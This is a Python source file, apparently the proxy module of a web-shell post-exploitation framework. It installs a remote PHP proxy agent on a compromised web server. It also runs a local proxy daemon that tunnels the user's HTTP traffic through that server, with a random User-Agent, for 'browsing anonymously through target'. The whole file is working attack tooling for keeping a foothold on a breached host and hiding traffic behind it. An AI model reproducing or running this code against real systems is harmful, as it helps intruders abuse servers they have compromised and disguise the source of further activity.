from modules.file.upload2web import Upload2web
from modules.net.phpproxy import Phpproxy
from core.moduleexception import ProbeSucceed, ProbeException
from core.savedargparse import SavedArgumentParser as ArgumentParser
from argparse import SUPPRESS
import re, os
from random import choice
from core.http.request import agents

import SocketServer
import urllib
from thread import start_new_thread
from core.utils import url_validator

WARN_NOT_URL = 'Not a valid URL'

class ProxyHandler(SocketServer.StreamRequestHandler):

    def __init__(self, request, client_address, server):

        self.proxies = {}
        self.useragent = choice(agents)
        self.phpproxy = server.rurl

        try:
            SocketServer.StreamRequestHandler.__init__(self, request, client_address,server)
        except Exception:
            pass


    def handle(self):
        req, body, cl, req_len, read_len = '', 0, 0, 0, 4096
        try:
            while 1:
                if not body:
                    line = self.rfile.readline(read_len)
                    if line == '':
                        # send it anyway..
                        self.send_req(req)
                        return
                    #if line[0:17].lower() == 'proxy-connection:':
                    #    req += "Connection: close\r\n"
                    #    continue
                    req += line
                    if not cl:
                        t = re.compile('^Content-Length: (\d+)', re.I).search(line)
                        if t is not None:
                            cl = int(t.group(1))
                            continue
                    if line == "\015\012" or line == "\012":
                        if not cl:
                            self.send_req(req)
                            return
                        else:
                            body = 1
                            read_len = cl
                else:
                    buf = self.rfile.read(read_len)
                    req += buf
                    req_len += len(buf)
                    read_len = cl - req_len
                    if req_len >= cl:
                        self.send_req(req)
                        return
        except Exception:
            return

    def send_req(self, req):
        #print req
        if req == '':
            return
        ua = urllib.FancyURLopener(self.proxies)
        ua.addheaders = [('User-Agent', self.useragent)]
        r = ua.open(self.phpproxy, urllib.urlencode({'req': req}))
        while 1:
            c = r.read(2048)
            if c == '': break
            self.wfile.write(c)
        self.wfile.close()


class Proxy(Phpproxy):
    '''Install and run Proxy to tunnel traffic through target'''

    
    def _set_args(self):
        self.argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
        
        self.argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
        self.argparser.add_argument('-force', action='store_true')
        self.argparser.add_argument('-just-run', metavar='URL')
        self.argparser.add_argument('-just-install', action='store_true')
        self.argparser.add_argument('-lhost', default='127.0.0.1')
        self.argparser.add_argument('-lport', default='8081', type=int)
    
        self.argparser.add_argument('-chunksize', type=int, default=1024, help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys(), help=SUPPRESS)


    def _run_proxy_server(self, rurl, lport, lhost):

        SocketServer.TCPServer.allow_reuse_address = True
        server = SocketServer.ThreadingTCPServer((lhost, lport), ProxyHandler)
        server.rurl = rurl
        server.serve_forever()


    def _get_proxy_path(self):
        return os.path.join(self.modhandler.path_modules, 'net', 'external', 'proxy.php')

    def _prepare(self):
        
        if not self.args['just_run']:
            Phpproxy._prepare(self)
        else:
            if not url_validator.match(self.args['just_run']):
                raise ProbeException(self.name, '\'%s\': %s' % (self.args['just_run'], WARN_NOT_URL) )
            
            self.args['url'] = self.args['just_run']
            self.args['rpath'] = ''

    def _probe(self):
        if not self.args['just_run']:
            try:
                Phpproxy._probe(self)
            except ProbeSucceed:
                pass
            
        if not self.args['just_install']:
            start_new_thread(self._run_proxy_server, (self.args['url'], self.args['lport'], self.args['lhost']))

    def _verify(self):
        if not self.args['just_run']:
            Phpproxy._verify(self)   
        else:
            # With just_run, suppose good result to correctly print output
            self._result = True
    
    def _stringify_result(self):
    
        Phpproxy._stringify_result(self)
        
        rpath = ' '
        if self.args['rpath']:
            rpath = '\'%s\' ' % self.args['rpath']
        
        self._output = """Proxy daemon spawned, set \'http://%s:%i\' as HTTP proxy to start browsing anonymously through target.
Run ":net.proxy -just-run '%s'" to respawn local proxy daemon without reinstalling remote agent.
When not needed anymore, remove %sremote agent.""" % (self.args['lhost'], self.args['lport'], self.args['url'], rpath)

        
        
            
        